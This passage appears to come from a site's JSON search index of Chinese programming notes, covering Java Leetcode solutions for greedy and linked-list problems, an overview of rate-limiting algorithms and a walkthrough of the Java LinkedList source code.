"},{"id":254,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E7%9B%AE%E5%BD%95/","title":"Leetcode 题解 - 目录","parent":"笔记","content":"Leetcode 题解    前言    本文从 Leetcode 中精选大概 200 左右的题目，去除了某些繁杂但是没有多少算法思想的题目，同时保留了面试中经常被问到的经典题目。\n算法思想     双指针 排序 贪心思想 二分查找 分治 搜索 动态规划 数学  数据结构相关     链表 树 栈和队列 哈希表 字符串 数组与矩阵 图 位运算  参考资料     Leetcode Weiss M A, 冯舜玺. 数据结构与算法分析——C 语言描述[J]. 2004. Sedgewick R. Algorithms[M]. Pearson Education India, 1988. 何海涛, 软件工程师. 剑指 Offer: 名企面试官精讲典型编程题[M]. 电子工业出版社, 2014. 《编程之美》小组. 编程之美[M]. 电子工业出版社, 2008. 左程云. 程序员代码面试指南[M]. 电子工业出版社, 2015.  "},{"id":255,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E8%B4%AA%E5%BF%83%E6%80%9D%E6%83%B3/","title":"Leetcode 题解 - 贪心思想","parent":"笔记","content":"Leetcode 题解 - 贪心思想     Leetcode 题解 - 贪心思想  1. 分配饼干 2. 不重叠的区间个数 3. 投飞镖刺破气球 4. 根据身高和序号重组队列 5. 买卖股票最大的收益 6. 买卖股票的最大收益 II 7. 种植花朵 8. 判断是否为子序列 9. 修改一个数成为非递减数组 10. 子数组最大的和 11. 分隔字符串使同种字符出现在一起    保证每次操作都是局部最优的，并且最后得到的结果是全局最优的。\n1. 分配饼干    455. Assign Cookies (Easy)\nLeetcode / 力扣\nInput: grid[1,3], size[1,2,4] Output: 2 题目描述：每个孩子都有一个满足度 grid，每个饼干都有一个大小 size，只有饼干的大小大于等于一个孩子的满足度，该孩子才会获得满足。求解最多可以获得满足的孩子数量。\n 给一个孩子的饼干应当尽量小并且又能满足该孩子，这样大饼干才能拿来给满足度比较大的孩子。 因为满足度最小的孩子最容易得到满足，所以先满足满足度最小的孩子。  在以上的解法中，我们只在每次分配时饼干时选择一种看起来是当前最优的分配方法，但无法保证这种局部最优的分配方法最后能得到全局最优解。我们假设能得到全局最优解，并使用反证法进行证明，即假设存在一种比我们使用的贪心策略更优的最优策略。如果不存在这种最优策略，表示贪心策略就是最优策略，得到的解也就是全局最优解。\n证明：假设在某次选择中，贪心策略选择给当前满足度最小的孩子分配第 m 个饼干，第 m 个饼干为可以满足该孩子的最小饼干。假设存在一种最优策略，可以给该孩子分配第 n 个饼干，并且 m \u0026lt; n。我们可以发现，经过这一轮分配，贪心策略分配后剩下的饼干一定有一个比最优策略来得大。因此在后续的分配中，贪心策略一定能满足更多的孩子。也就是说不存在比贪心策略更优的策略，即贪心策略就是最优策略。\n\npublic int findContentChildren(int[] grid, int[] size) { if (grid == null || size == null) return 0; Arrays.sort(grid); Arrays.sort(size); int gi = 0, si = 0; while (gi \u0026lt; grid.length \u0026amp;\u0026amp; si \u0026lt; size.length) { if (grid[gi] \u0026lt;= size[si]) { gi++; } si++; } return gi; } 2. 不重叠的区间个数    435. Non-overlapping Intervals (Medium)\nLeetcode / 力扣\nInput: [ [1,2], [1,2], [1,2] ] Output: 2 Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping. Input: [ [1,2], [2,3] ] Output: 0 Explanation: You don\u0026#39;t need to remove any of the intervals since they\u0026#39;re already non-overlapping. 题目描述：计算让一组区间不重叠所需要移除的区间个数。\n先计算最多能组成的不重叠区间个数，然后用区间总个数减去不重叠区间的个数。\n在每次选择中，区间的结尾最为重要，选择的区间结尾越小，留给后面的区间的空间越大，那么后面能够选择的区间个数也就越大。\n按区间的结尾进行排序，每次选择结尾最小，并且和前一个区间不重叠的区间。\npublic int eraseOverlapIntervals(int[][] intervals) { if (intervals.length == 0) { return 0; } Arrays.sort(intervals, Comparator.comparingInt(o -\u0026gt; o[1])); int cnt = 1; int end = intervals[0][1]; for (int i = 1; i \u0026lt; intervals.length; i++) { if (intervals[i][0] \u0026lt; end) { continue; } end = intervals[i][1]; cnt++; } return intervals.length - cnt; } 使用 lambda 表示式创建 Comparator 会导致算法运行时间过长，如果注重运行时间，可以修改为普通创建 Comparator 语句：\nArrays.sort(intervals, new Comparator\u0026lt;int[]\u0026gt;() { @Override public int compare(int[] o1, int[] o2) { return (o1[1] \u0026lt; o2[1]) ? -1 : ((o1[1] == o2[1]) ? 0 : 1); } }); 实现 compare() 函数时避免使用 return o1[1] - o2[1]; 这种减法操作，防止溢出。\n3. 投飞镖刺破气球    452. Minimum Number of Arrows to Burst Balloons (Medium)\nLeetcode / 力扣\nInput: [[10,16], [2,8], [1,6], [7,12]] Output: 2 题目描述：气球在一个水平数轴上摆放，可以重叠，飞镖垂直投向坐标轴，使得路径上的气球都被刺破。求解最小的投飞镖次数使所有气球都被刺破。\n也是计算不重叠的区间个数，不过和 Non-overlapping Intervals 的区别在于，[1, 2] 和 [2, 3] 在本题中算是重叠区间。\npublic int findMinArrowShots(int[][] points) { if (points.length == 0) { return 0; } Arrays.sort(points, Comparator.comparingInt(o -\u0026gt; o[1])); int cnt = 1, end = points[0][1]; for (int i = 1; i \u0026lt; points.length; i++) { if (points[i][0] \u0026lt;= end) { continue; } cnt++; end = points[i][1]; } return cnt; } 4. 根据身高和序号重组队列    406. Queue Reconstruction by Height(Medium)\nLeetcode / 力扣\nInput: [[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]] Output: [[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]] 题目描述：一个学生用两个分量 (h, k) 描述，h 表示身高，k 表示排在前面的有 k 个学生的身高比他高或者和他一样高。\n为了使插入操作不影响后续的操作，身高较高的学生应该先做插入操作，否则身高较小的学生原先正确插入的第 k 个位置可能会变成第 k+1 个位置。\n身高 h 降序、个数 k 值升序，然后将某个学生插入队列的第 k 个位置中。\npublic int[][] reconstructQueue(int[][] people) { if (people == null || people.length == 0 || people[0].length == 0) { return new int[0][0]; } Arrays.sort(people, (a, b) -\u0026gt; (a[0] == b[0] ? a[1] - b[1] : b[0] - a[0])); List\u0026lt;int[]\u0026gt; queue = new ArrayList\u0026lt;\u0026gt;(); for (int[] p : people) { queue.add(p[1], p); } return queue.toArray(new int[queue.size()][]); } 5. 买卖股票最大的收益    121. Best Time to Buy and Sell Stock (Easy)\nLeetcode / 力扣\n题目描述：一次股票交易包含买入和卖出，只进行一次交易，求最大收益。\n只要记录前面的最小价格，将这个最小价格作为买入价格，然后将当前的价格作为售出价格，查看当前收益是不是最大收益。\npublic int maxProfit(int[] prices) { int n = prices.length; if (n == 0) return 0; int soFarMin = prices[0]; int max = 0; for (int i = 1; i \u0026lt; n; i++) { if (soFarMin \u0026gt; prices[i]) soFarMin = prices[i]; else max = Math.max(max, prices[i] - soFarMin); } return max; } 6. 买卖股票的最大收益 II    122. Best Time to Buy and Sell Stock II (Easy)\nLeetcode / 力扣\n题目描述：可以进行多次交易，多次交易之间不能交叉进行，可以进行多次交易。\n对于 [a, b, c, d]，如果有 a \u0026lt;= b \u0026lt;= c \u0026lt;= d ，那么最大收益为 d - a。而 d - a = (d - c) + (c - b) + (b - a) ，因此当访问到一个 prices[i] 且 prices[i] - prices[i-1] \u0026gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中。\npublic int maxProfit(int[] prices) { int profit = 0; for (int i = 1; i \u0026lt; prices.length; i++) { if (prices[i] \u0026gt; prices[i - 1]) { profit += (prices[i] - prices[i - 1]); } } return profit; } 7. 种植花朵    605. Can Place Flowers (Easy)\nLeetcode / 力扣\nInput: flowerbed = [1,0,0,0,1], n = 1 Output: True 题目描述：flowerbed 数组中 1 表示已经种下了花朵。花朵之间至少需要一个单位的间隔，求解是否能种下 n 朵花。\npublic boolean canPlaceFlowers(int[] flowerbed, int n) { int len = flowerbed.length; int cnt = 0; for (int i = 0; i \u0026lt; len \u0026amp;\u0026amp; cnt \u0026lt; n; i++) { if (flowerbed[i] == 1) { continue; } int pre = i == 0 ? 0 : flowerbed[i - 1]; int next = i == len - 1 ? 0 : flowerbed[i + 1]; if (pre == 0 \u0026amp;\u0026amp; next == 0) { cnt++; flowerbed[i] = 1; } } return cnt \u0026gt;= n; } 8. 判断是否为子序列    392. Is Subsequence (Medium)\nLeetcode / 力扣\ns = \u0026#34;abc\u0026#34;, t = \u0026#34;ahbgdc\u0026#34; Return true. public boolean isSubsequence(String s, String t) { int index = -1; for (char c : s.toCharArray()) { index = t.indexOf(c, index + 1); if (index == -1) { return false; } } return true; } 9. 修改一个数成为非递减数组    665. Non-decreasing Array (Easy)\nLeetcode / 力扣\nInput: [4,2,3] Output: True Explanation: You could modify the first 4 to 1 to get a non-decreasing array. 题目描述：判断一个数组是否能只修改一个数就成为非递减数组。\n在出现 nums[i] \u0026lt; nums[i - 1] 时，需要考虑的是应该修改数组的哪个数，使得本次修改能使 i 之前的数组成为非递减数组，并且 不影响后续的操作 。优先考虑令 nums[i - 1] = nums[i]，因为如果修改 nums[i] = nums[i - 1] 的话，那么 nums[i] 这个数会变大，就有可能比 nums[i + 1] 大，从而影响了后续操作。还有一个比较特别的情况就是 nums[i] \u0026lt; nums[i - 2]，修改 nums[i - 1] = nums[i] 不能使数组成为非递减数组，只能修改 nums[i] = nums[i - 1]。\npublic boolean checkPossibility(int[] nums) { int cnt = 0; for (int i = 1; i \u0026lt; nums.length \u0026amp;\u0026amp; cnt \u0026lt; 2; i++) { if (nums[i] \u0026gt;= nums[i - 1]) { continue; } cnt++; if (i - 2 \u0026gt;= 0 \u0026amp;\u0026amp; nums[i - 2] \u0026gt; nums[i]) { nums[i] = nums[i - 1]; } else { nums[i - 1] = nums[i]; } } return cnt \u0026lt;= 1; } 10. 子数组最大的和    53. Maximum Subarray (Easy)\nLeetcode / 力扣\nFor example, given the array [-2,1,-3,4,-1,2,1,-5,4], the contiguous subarray [4,-1,2,1] has the largest sum = 6. public int maxSubArray(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int preSum = nums[0]; int maxSum = preSum; for (int i = 1; i \u0026lt; nums.length; i++) { preSum = preSum \u0026gt; 0 ? preSum + nums[i] : nums[i]; maxSum = Math.max(maxSum, preSum); } return maxSum; } 11. 分隔字符串使同种字符出现在一起    763. Partition Labels (Medium)\nLeetcode / 力扣\nInput: S = \u0026#34;ababcbacadefegdehijhklij\u0026#34; Output: [9,7,8] Explanation: The partition is \u0026#34;ababcbaca\u0026#34;, \u0026#34;defegde\u0026#34;, \u0026#34;hijhklij\u0026#34;. This is a partition so that each letter appears in at most one part. A partition like \u0026#34;ababcbacadefegde\u0026#34;, \u0026#34;hijhklij\u0026#34; is incorrect, because it splits S into less parts. public List\u0026lt;Integer\u0026gt; partitionLabels(String S) { int[] lastIndexsOfChar = new int[26]; for (int i = 0; i \u0026lt; S.length(); i++) { lastIndexsOfChar[char2Index(S.charAt(i))] = i; } List\u0026lt;Integer\u0026gt; partitions = new ArrayList\u0026lt;\u0026gt;(); int firstIndex = 0; while (firstIndex \u0026lt; S.length()) { int lastIndex = firstIndex; for (int i = firstIndex; i \u0026lt; S.length() \u0026amp;\u0026amp; i \u0026lt;= lastIndex; i++) { int index = lastIndexsOfChar[char2Index(S.charAt(i))]; if (index \u0026gt; lastIndex) { lastIndex = index; } } partitions.add(lastIndex - firstIndex + 1); firstIndex = lastIndex + 1; } return partitions; } private int char2Index(char c) { return c - \u0026#39;a\u0026#39;; } "},{"id":256,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E9%93%BE%E8%A1%A8/","title":"Leetcode 题解 - 链表","parent":"笔记","content":"Leetcode 题解 - 链表     Leetcode 题解 - 链表  1. 找出两个链表的交点 2. 链表反转 3. 归并两个有序的链表 4. 从有序链表中删除重复节点 5. 删除链表的倒数第 n 个节点 6. 交换链表中的相邻结点 7. 链表求和 8. 回文链表 9. 分隔链表 10. 链表元素按奇偶聚集    链表是空节点，或者有一个值和一个指向下一个链表的指针，因此很多链表问题可以用递归来处理。\n1. 找出两个链表的交点    160. Intersection of Two Linked Lists (Easy)\nLeetcode / 力扣\n例如以下示例中 A 和 B 两个链表相交于 c1：\nA: a1 → a2 ↘ c1 → c2 → c3 ↗ B: b1 → b2 → b3 但是不会出现以下相交的情况，因为每个节点只有一个 next 指针，也就只能有一个后继节点，而以下示例中节点 c 有两个后继节点。\nA: a1 → a2 d1 → d2 ↘ ↗ c ↗ ↘ B: b1 → b2 → b3 e1 → e2 要求时间复杂度为 O(N)，空间复杂度为 O(1)。如果不存在交点则返回 null。\n设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。\n当访问 A 链表的指针访问到链表尾部时，令它从链表 B 的头部开始访问链表 B；同样地，当访问 B 链表的指针访问到链表尾部时，令它从链表 A 的头部开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。\n如果不存在交点，那么 a + b = b + a，以下实现代码中 l1 和 l2 会同时为 null，从而退出循环。\npublic ListNode getIntersectionNode(ListNode headA, ListNode headB) { ListNode l1 = headA, l2 = headB; while (l1 != l2) { l1 = (l1 == null) ? headB : l1.next; l2 = (l2 == null) ? headA : l2.next; } return l1; } 如果只是判断是否存在交点，那么就是另一个问题，即 编程之美 3.6 的问题。有两种解法：\n 把第一个链表的结尾连接到第二个链表的开头，看第二个链表是否存在环； 或者直接比较两个链表的最后一个节点是否相同。  2. 链表反转    206. Reverse Linked List (Easy)\nLeetcode / 力扣\n递归\npublic ListNode reverseList(ListNode head) { if (head == null || head.next == null) { return head; } ListNode next = head.next; ListNode newHead = reverseList(next); next.next = head; head.next = null; return newHead; } 头插法\npublic ListNode reverseList(ListNode head) { ListNode newHead = new ListNode(-1); while (head != null) { ListNode next = head.next; head.next = newHead.next; newHead.next = head; head = next; } return newHead.next; } 3. 归并两个有序的链表    21. Merge Two Sorted Lists (Easy)\nLeetcode / 力扣\npublic ListNode mergeTwoLists(ListNode l1, ListNode l2) { if (l1 == null) return l2; if (l2 == null) return l1; if (l1.val \u0026lt; l2.val) { l1.next = mergeTwoLists(l1.next, l2); return l1; } else { l2.next = mergeTwoLists(l1, l2.next); return l2; } } 4. 从有序链表中删除重复节点    83. Remove Duplicates from Sorted List (Easy)\nLeetcode / 力扣\nGiven 1-\u0026gt;1-\u0026gt;2, return 1-\u0026gt;2. Given 1-\u0026gt;1-\u0026gt;2-\u0026gt;3-\u0026gt;3, return 1-\u0026gt;2-\u0026gt;3. public ListNode deleteDuplicates(ListNode head) { if (head == null || head.next == null) return head; head.next = deleteDuplicates(head.next); return head.val == head.next.val ? head.next : head; } 5. 删除链表的倒数第 n 个节点    19. Remove Nth Node From End of List (Medium)\nLeetcode / 力扣\nGiven linked list: 1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;5, and n = 2. After removing the second node from the end, the linked list becomes 1-\u0026gt;2-\u0026gt;3-\u0026gt;5. public ListNode removeNthFromEnd(ListNode head, int n) { ListNode fast = head; while (n-- \u0026gt; 0) { fast = fast.next; } if (fast == null) return head.next; ListNode slow = head; while (fast.next != null) { fast = fast.next; slow = slow.next; } slow.next = slow.next.next; return head; } 6. 交换链表中的相邻结点    24. Swap Nodes in Pairs (Medium)\nLeetcode / 力扣\nGiven 1-\u0026gt;2-\u0026gt;3-\u0026gt;4, you should return the list as 2-\u0026gt;1-\u0026gt;4-\u0026gt;3. 题目要求：不能修改结点的 val 值，O(1) 空间复杂度。\npublic ListNode swapPairs(ListNode head) { ListNode node = new ListNode(-1); node.next = head; ListNode pre = node; while (pre.next != null \u0026amp;\u0026amp; pre.next.next != null) { ListNode l1 = pre.next, l2 = pre.next.next; ListNode next = l2.next; l1.next = next; l2.next = l1; pre.next = l2; pre = l1; } return node.next; } 7. 链表求和    445. Add Two Numbers II (Medium)\nLeetcode / 力扣\nInput: (7 -\u0026gt; 2 -\u0026gt; 4 -\u0026gt; 3) + (5 -\u0026gt; 6 -\u0026gt; 4) Output: 7 -\u0026gt; 8 -\u0026gt; 0 -\u0026gt; 7 题目要求：不能修改原始链表。\npublic ListNode addTwoNumbers(ListNode l1, ListNode l2) { Stack\u0026lt;Integer\u0026gt; l1Stack = buildStack(l1); Stack\u0026lt;Integer\u0026gt; l2Stack = buildStack(l2); ListNode head = new ListNode(-1); int carry = 0; while (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != 0) { int x = l1Stack.isEmpty() ? 0 : l1Stack.pop(); int y = l2Stack.isEmpty() ? 0 : l2Stack.pop(); int sum = x + y + carry; ListNode node = new ListNode(sum % 10); node.next = head.next; head.next = node; carry = sum / 10; } return head.next; } private Stack\u0026lt;Integer\u0026gt; buildStack(ListNode l) { Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); while (l != null) { stack.push(l.val); l = l.next; } return stack; } 8. 回文链表    234. Palindrome Linked List (Easy)\nLeetcode / 力扣\n题目要求：以 O(1) 的空间复杂度来求解。\n切成两半，把后半段反转，然后比较两半是否相等。\npublic boolean isPalindrome(ListNode head) { if (head == null || head.next == null) return true; ListNode slow = head, fast = head.next; while (fast != null \u0026amp;\u0026amp; fast.next != null) { slow = slow.next; fast = fast.next.next; } if (fast != null) slow = slow.next; // 偶数节点，让 slow 指向下一个节点  cut(head, slow); // 切成两个链表  return isEqual(head, reverse(slow)); } private void cut(ListNode head, ListNode cutNode) { while (head.next != cutNode) { head = head.next; } head.next = null; } private ListNode reverse(ListNode head) { ListNode newHead = null; while (head != null) { ListNode nextNode = head.next; head.next = newHead; newHead = head; head = nextNode; } return newHead; } private boolean isEqual(ListNode l1, ListNode l2) { while (l1 != null \u0026amp;\u0026amp; l2 != null) { if (l1.val != l2.val) return false; l1 = l1.next; l2 = l2.next; } return true; } 9. 分隔链表    725. Split Linked List in Parts(Medium)\nLeetcode / 力扣\nInput: root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3 Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]] Explanation: The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts. 题目描述：把链表分隔成 k 部分，每部分的长度都应该尽可能相同，排在前面的长度应该大于等于后面的。\npublic ListNode[] splitListToParts(ListNode root, int k) { int N = 0; ListNode cur = root; while (cur != null) { N++; cur = cur.next; } int mod = N % k; int size = N / k; ListNode[] ret = new ListNode[k]; cur = root; for (int i = 0; cur != null \u0026amp;\u0026amp; i \u0026lt; k; i++) { ret[i] = cur; int curSize = size + (mod-- \u0026gt; 0 ? 1 : 0); for (int j = 0; j \u0026lt; curSize - 1; j++) { cur = cur.next; } ListNode next = cur.next; cur.next = null; cur = next; } return ret; } 10. 链表元素按奇偶聚集    328. Odd Even Linked List (Medium)\nLeetcode / 力扣\nExample: Given 1-\u0026gt;2-\u0026gt;3-\u0026gt;4-\u0026gt;5-\u0026gt;NULL, return 1-\u0026gt;3-\u0026gt;5-\u0026gt;2-\u0026gt;4-\u0026gt;NULL. public ListNode oddEvenList(ListNode head) { if (head == null) { return head; } ListNode odd = head, even = head.next, evenHead = even; while (even != null \u0026amp;\u0026amp; even.next != null) { odd.next = odd.next.next; odd = odd.next; even.next = even.next.next; even = even.next; } odd.next = evenHead; return head; } "},{"id":257,"href":"/system-design/high-availability/limit-request/","title":"limit-request","parent":"high-availability","content":"限流的算法有哪些？    简单介绍 4 种非常好理解并且容易实现的限流算法！\n下图的图片不是 Guide 哥自己画的哦！图片来源于 InfoQ 的一篇文章《分布式服务限流实战，已经为你排好坑了》。\n固定窗口计数器算法    该算法规定我们单位时间处理的请求数量。比如我们规定我们的一个接口一分钟只能访问10次的话。使用固定窗口计数器算法的话可以这样实现：给定一个变量counter来记录处理的请求数量，当1分钟之内处理一个请求之后counter+1，1分钟之内的如果counter=10的话，后续的请求就会被全部拒绝。等到 1分钟结束后，将counter回归成0，重新开始计数（ps：只要过了一个周期就将counter回归成0）。\n这种限流算法无法保证限流速率，因而无法保证突然激增的流量。比如我们限制一个接口一分钟只能访问10次的话，前半分钟一个请求没有接收，后半分钟接收了10个请求。\n滑动窗口计数器算法    该算法算的上是固定窗口计数器算法的升级版。滑动窗口计数器算法相比于固定窗口计数器算法的优化在于：它把时间以一定比例分片。例如我们的接口限流每分钟处理60个请求，我们可以把 1 分钟分为60个窗口。每隔1秒移动一次，每个窗口一秒只能处理 不大于 60(请求数)/60（窗口数） 的请求， 如果当前窗口的请求计数总和超过了限制的数量的话就不再处理其他请求。\n很显然：当滑动窗口的格子划分的越多，滑动窗口的滚动就越平滑，限流的统计就会越精确。\n漏桶算法    我们可以把发请求的动作比作成注水到桶中，我们处理请求的过程可以比喻为 漏桶漏水 。我们往桶中以任意速率流入水，以一定速率流出水。当水超过桶容量则丢弃，因为桶容量是不变的，保证了整体的速率。\n如果想要实现这个算法的话也很简单，准备一个队列用来保存请求，然后我们定期从队列中拿请求来执行就好了。\n令牌桶算法    令牌桶算法也比较简单。和漏桶算法一样，我们的主角还是桶（这限流算法和桶过不去啊）。不过现在桶里装的是令牌了，请求在被处理之前需要拿到一个令牌，请求处理完毕之后将这个令牌丢弃（删除）。\n我们根据限流大小，按照一定的速率往桶里添加令牌即可！\n漏桶算法 vs 令牌桶算法 ：\n"},{"id":258,"href":"/java/collection/LinkedList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","title":"LinkedList源码分析","parent":"collection","content":" 简介 内部结构分析 LinkedList源码分析  构造方法 添加（add）方法 根据位置取数据的方法 根据对象得到索引的方法 检查链表是否包含某对象的方法： 删除（remove/pop）方法   LinkedList类常用方法测试：  简介    LinkedList是一个实现了List接口和Deque接口的双端链表。 LinkedList底层的链表结构使它支持高效的插入和删除操作，另外它实现了Deque接口，使得LinkedList类也具有队列的特性; LinkedList不是线程安全的，如果想使LinkedList变成线程安全的，可以调用静态类Collections类中的synchronizedList方法：\nList list=Collections.synchronizedList(new LinkedList(...)); 内部结构分析    如下图所示：\n看完了图之后，我们再看LinkedList类中的一个内部私有类Node就很好理解了：\nprivate static class Node\u0026lt;E\u0026gt; { E item;//节点值  Node\u0026lt;E\u0026gt; next;//后继节点  Node\u0026lt;E\u0026gt; prev;//前驱节点  Node(Node\u0026lt;E\u0026gt; prev, E element, Node\u0026lt;E\u0026gt; next) { this.item = element; this.next = next; this.prev = prev; } } 这个类就代表双端链表的节点Node。这个类有三个属性，分别是前驱节点，本节点的值，后继结点。\nLinkedList源码分析    构造方法    空构造方法：\npublic LinkedList() { } 用已有的集合创建链表的构造方法：\npublic LinkedList(Collection\u0026lt;? extends E\u0026gt; c) { this(); addAll(c); } add方法    add(E e) 方法：将元素添加到链表尾部\npublic boolean add(E e) { linkLast(e);//这里就只调用了这一个方法  return true; } /** * 链接使e作为最后一个元素。 */ void linkLast(E e) { final Node\u0026lt;E\u0026gt; l = last; final Node\u0026lt;E\u0026gt; newNode = new Node\u0026lt;\u0026gt;(l, e, null); last = newNode;//新建节点  if (l == null) first = newNode; else l.next = newNode;//指向后继元素也就是指向下一个元素  size++; modCount++; } add(int index,E e)：在指定位置添加元素\npublic void add(int index, E element) { checkPositionIndex(index); //检查索引是否处于[0-size]之间  if (index == size)//添加在链表尾部  linkLast(element); else//添加在链表中间  linkBefore(element, node(index)); } linkBefore方法需要给定两个参数，一个插入节点的值，一个指定的node，所以我们又调用了Node(index)去找到index对应的node\naddAll(Collection c )：将集合插入到链表尾部\npublic boolean addAll(Collection\u0026lt;? extends E\u0026gt; c) { return addAll(size, c); } addAll(int index, Collection c)： 将集合从指定位置开始插入\npublic boolean addAll(int index, Collection\u0026lt;? extends E\u0026gt; c) { //1:检查index范围是否在size之内  checkPositionIndex(index); //2:toArray()方法把集合的数据存到对象数组中  Object[] a = c.toArray(); int numNew = a.length; if (numNew == 0) return false; //3：得到插入位置的前驱节点和后继节点  Node\u0026lt;E\u0026gt; pred, succ; //如果插入位置为尾部，前驱节点为last，后继节点为null  if (index == size) { succ = null; pred = last; } //否则，调用node()方法得到后继节点，再得到前驱节点  else { succ = node(index); pred = succ.prev; } // 4：遍历数据将数据插入  for (Object o : a) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) o; //创建新节点  Node\u0026lt;E\u0026gt; newNode = new Node\u0026lt;\u0026gt;(pred, e, null); //如果插入位置在链表头部  if (pred == null) first = newNode; else pred.next = newNode; pred = newNode; } //如果插入位置在尾部，重置last节点  if (succ == null) { last = pred; } //否则，将插入的链表与先前链表连接起来  else { pred.next = succ; succ.prev = pred; } size += numNew; modCount++; return true; } 上面可以看出addAll方法通常包括下面四个步骤：\n 检查index范围是否在size之内 toArray()方法把集合的数据存到对象数组中 得到插入位置的前驱和后继节点 遍历数据，将数据插入到指定位置  addFirst(E e)： 将元素添加到链表头部\npublic void addFirst(E e) { linkFirst(e); } private void linkFirst(E e) { final Node\u0026lt;E\u0026gt; f = first; final Node\u0026lt;E\u0026gt; newNode = new Node\u0026lt;\u0026gt;(null, e, f);//新建节点，以头节点为后继节点  first = newNode; //如果链表为空，last节点也指向该节点  if (f == null) last = newNode; //否则，将头节点的前驱指针指向新节点，也就是指向前一个元素  else f.prev = newNode; size++; modCount++; } addLast(E e)： 将元素添加到链表尾部，与 add(E e) 方法一样\npublic void addLast(E e) { linkLast(e); } 根据位置取数据的方法    get(int index)： 根据指定索引返回数据\npublic E get(int index) { //检查index范围是否在size之内  checkElementIndex(index); //调用Node(index)去找到index对应的node然后返回它的值  return node(index).item; } 获取头节点（index=0）数据方法:\npublic E getFirst() { final Node\u0026lt;E\u0026gt; f = first; if (f == null) throw new NoSuchElementException(); return f.item; } public E element() { return getFirst(); } public E peek() { final Node\u0026lt;E\u0026gt; f = first; return (f == null) ? null : f.item; } public E peekFirst() { final Node\u0026lt;E\u0026gt; f = first; return (f == null) ? null : f.item; } 区别： getFirst(),element(),peek(),peekFirst() 这四个获取头结点方法的区别在于对链表为空时的处理，是抛出异常还是返回null，其中getFirst() 和element() 方法将会在链表为空时，抛出异常\nelement()方法的内部就是使用getFirst()实现的。它们会在链表为空时，抛出NoSuchElementException\n获取尾节点（index=-1）数据方法:\npublic E getLast() { final Node\u0026lt;E\u0026gt; l = last; if (l == null) throw new NoSuchElementException(); return l.item; } public E peekLast() { final Node\u0026lt;E\u0026gt; l = last; return (l == null) ? null : l.item; } 两者区别： getLast() 方法在链表为空时，会抛出NoSuchElementException，而peekLast() 则不会，只是会返回 null。\n根据对象得到索引的方法    int indexOf(Object o)： 从头遍历找\npublic int indexOf(Object o) { int index = 0; if (o == null) { //从头遍历  for (Node\u0026lt;E\u0026gt; x = first; x != null; x = x.next) { if (x.item == null) return index; index++; } } else { //从头遍历  for (Node\u0026lt;E\u0026gt; x = first; x != null; x = x.next) { if (o.equals(x.item)) return index; index++; } } return -1; } int lastIndexOf(Object o)： 从尾遍历找\npublic int lastIndexOf(Object o) { int index = size; if (o == null) { //从尾遍历  for (Node\u0026lt;E\u0026gt; x = last; x != null; x = x.prev) { index--; if (x.item == null) return index; } } else { //从尾遍历  for (Node\u0026lt;E\u0026gt; x = last; x != null; x = x.prev) { index--; if (o.equals(x.item)) return index; } } return -1; } 检查链表是否包含某对象的方法：    contains(Object o)： 检查对象o是否存在于链表中\npublic boolean contains(Object o) { return indexOf(o) != -1; } 删除方法    remove() ,removeFirst(),pop(): 删除头节点\npublic E pop() { return removeFirst(); } public E remove() { return removeFirst(); } public E removeFirst() { final Node\u0026lt;E\u0026gt; f = first; if (f == null) throw new NoSuchElementException(); return unlinkFirst(f); } removeLast(),pollLast(): 删除尾节点\npublic E removeLast() { final Node\u0026lt;E\u0026gt; l = last; if (l == null) throw new NoSuchElementException(); return unlinkLast(l); } public E pollLast() { final Node\u0026lt;E\u0026gt; l = last; return (l == null) ? null : unlinkLast(l); } 区别： removeLast()在链表为空时将抛出NoSuchElementException，而pollLast()方法返回null。\nremove(Object o): 删除指定元素\npublic boolean remove(Object o) { //如果删除对象为null  if (o == null) { //从头开始遍历  for (Node\u0026lt;E\u0026gt; x = first; x != null; x = x.next) { //找到元素  if (x.item == null) { //从链表中移除找到的元素  unlink(x); return true; } } } else { //从头开始遍历  for (Node\u0026lt;E\u0026gt; x = first; x != null; x = x.next) { //找到元素  if (o.equals(x.item)) { //从链表中移除找到的元素  unlink(x); return true; } } } return false; } 当删除指定对象时，只需调用remove(Object o)即可，不过该方法一次只会删除一个匹配的对象，如果删除了匹配对象，返回true，否则false。\nunlink(Node x) 方法：\nE unlink(Node\u0026lt;E\u0026gt; x) { // assert x != null;  final E element = x.item; final Node\u0026lt;E\u0026gt; next = x.next;//得到后继节点  final Node\u0026lt;E\u0026gt; prev = x.prev;//得到前驱节点  //删除前驱指针  if (prev == null) { first = next;//如果删除的节点是头节点,令头节点指向该节点的后继节点  } else { prev.next = next;//将前驱节点的后继节点指向后继节点  x.prev = null; } //删除后继指针  if (next == null) { last = prev;//如果删除的节点是尾节点,令尾节点指向该节点的前驱节点  } else { next.prev = prev; x.next = null; } x.item = null; size--; modCount++; return element; } remove(int index)：删除指定位置的元素\npublic E remove(int index) { //检查index范围  checkElementIndex(index); //将节点删除  return unlink(node(index)); } LinkedList类常用方法测试    package list; import java.util.Iterator; import java.util.LinkedList; public class LinkedListDemo { public static void main(String[] srgs) { //创建存放int类型的linkedList  LinkedList\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); /************************** linkedList的基本操作 ************************/ linkedList.addFirst(0); // 添加元素到列表开头  linkedList.add(1); // 在列表结尾添加元素  linkedList.add(2, 2); // 在指定位置添加元素  linkedList.addLast(3); // 添加元素到列表结尾  